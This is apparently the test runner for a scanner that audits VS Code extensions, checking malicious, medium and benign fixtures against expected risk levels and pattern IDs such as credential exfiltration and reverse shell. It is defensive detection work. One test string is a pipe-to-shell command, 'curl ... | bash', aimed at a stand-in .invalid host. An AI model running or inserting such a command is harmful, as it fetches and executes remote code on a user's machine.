#!/usr/bin/env python3
"""Canary + control tests.

Every mal-* fixture must reach its expected level AND fire its expected pattern; every ok-*
fixture (things popular extensions really do) must scan SAFE; med-* fixtures must land exactly
at MEDIUM. The fixtures are inert: hosts are
reserved (.invalid / TEST-NET), payloads are console.log strings, and nothing here is executed.

    python tests/run.py
"""
import io
import os
import sys
import zipfile

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
import vsix_audit as va  # noqa: E402

EXPECT = {
    "mal-glassworm": ("CRITICAL", "invisible_unicode"),
    "mal-solana-c2": ("CRITICAL", "blockchain_c2"),
    "mal-calendar-c2": ("HIGH", "calendar_c2"),
    "mal-secret-exfil": ("CRITICAL", "credential_exfil"),
    "mal-ssh-stealer": ("CRITICAL", "credential_exfil"),
    "mal-env-startup": ("CRITICAL", "env_exfil"),
    "mal-revshell": ("CRITICAL", "reverse_shell"),
    "mal-worm-ovsx": ("CRITICAL", "worm_propagation"),
    "mal-download-exec": ("CRITICAL", "download_execute"),
    "mal-wallet": ("HIGH", "wallet_browser_theft"),
    "mal-obfuscated": ("HIGH", "obfuscation"),
    "mal-cookie-stealer": ("HIGH", "browser_store_read"),
    "mal-chrome-key": ("HIGH", "wallet_browser_theft"),
    "mal-telegram-stealer": ("CRITICAL", "credential_exfil"),
    "mal-http-installer": ("CRITICAL", "download_execute"),
}
# reported, but deliberately below the HIGH line: an installer from the extension's own vendor
MEDIUM = {"med-vendor-installer": "remote_installer", "med-cookie-import": "browser_store_read",
          "med-vendor-github-org": "remote_installer"}


def main():
    fails = 0
    root = os.path.join(HERE, "fixtures")
    for name in sorted(os.listdir(root)):
        r = va.audit_dir(os.path.join(root, name), name)
        ids = sorted({f["id"] for f in r["findings"]})
        if name.startswith("mal-"):
            want, fid = EXPECT[name]
            ok = va.SEV_ORDER[r["risk_level"]] >= va.SEV_ORDER[want] and fid in ids
        elif name.startswith("med-"):
            want, fid = "MEDIUM", MEDIUM[name]
            ok = r["risk_level"] == "MEDIUM" and fid in ids
        else:
            want, fid = "SAFE", "-"
            ok = r["risk_level"] == "SAFE"
        fails += not ok
        print("%s %-20s got=%-8s want=%-8s %-20s %s" % (
            "PASS" if ok else "FAIL", name, r["risk_level"], want, fid, ids))
    # .vsix round trip: zip a canary the way vsce does (extension/ prefix) and scan the archive
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        d = os.path.join(root, "mal-env-startup")
        for fn in os.listdir(d):
            z.write(os.path.join(d, fn), "extension/" + fn)
        z.writestr("[Content_Types].xml", "<Types/>")
    files, bins = va.files_from_vsix(buf.getvalue())
    checks = [
        (va.scan_extension(files, "zip", bins)["risk_level"] == "CRITICAL", ".vsix archive round trip"),
        (va.scan("curl https://x.invalid/a | bash")["risk_level"] == "CRITICAL", "--text pipe-to-shell"),
        (va.scan("const x = require('vscode')")["risk_level"] == "SAFE", "--text benign"),
        (va.split_id("ms-python.python@2024.1.0") == ("ms-python", "python", "2024.1.0"), "split versioned id"),
        (va.split_id("redhat.vscode-yaml") == ("redhat", "vscode-yaml", "latest"), "split bare id"),
    ]
    for ok, label in checks:
        fails += not ok
        print("%s %s" % ("PASS" if ok else "FAIL", label))
    print("\n%d failure(s)" % fails)
    return 1 if fails else 0


if __name__ == "__main__":
    sys.exit(main())
